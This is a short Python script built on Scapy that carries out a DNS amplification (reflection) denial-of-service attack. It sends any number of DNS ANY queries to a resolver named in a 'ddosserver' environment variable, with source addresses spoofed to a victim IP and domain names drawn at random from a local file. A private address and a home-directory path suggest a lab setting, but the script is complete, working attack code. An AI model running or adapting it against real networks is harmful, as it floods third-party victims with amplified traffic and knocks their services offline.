from scapy.all import *
import os
import random
import sys

# Get the server's IP address from the environment variable
ddosserver_ip = os.getenv("ddosserver")

if ddosserver_ip is None:
    print("An IP address was not provided for the server. Make sure to set the ddosserver environment variable. Run export ddosserver=¨ip¨")
    exit()

# Check the number of DNS packets provided as an argument
if len(sys.argv) != 2:
    print("Usage: python3 script.py <dns_query_packets>")
    exit(1)

try:
    dns_query_packets = int(sys.argv[1])
except ValueError:
    print("The argument value must be a valid integer.")
    exit(1)

# Read domain names from the file
with open("/home/cognet/domain.txt", 'r') as file:
    qnames = file.read().splitlines()

open_dns_resolver = ddosserver_ip  # Replace with the IP address of your DNS server
# Generate spoofed ip addres
spoofed_ip = "10.0.25.1"

for _ in range(dns_query_packets):
    qname = random.choice(qnames)

    # Create the DNS packet with a spoofed source IP address and random domain name
    dns_query = IP(src=spoofed_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
                DNS(rd=1, qd=DNSQR(qname=qname, qtype="ANY"))

    # Send the packet
    send(dns_query)
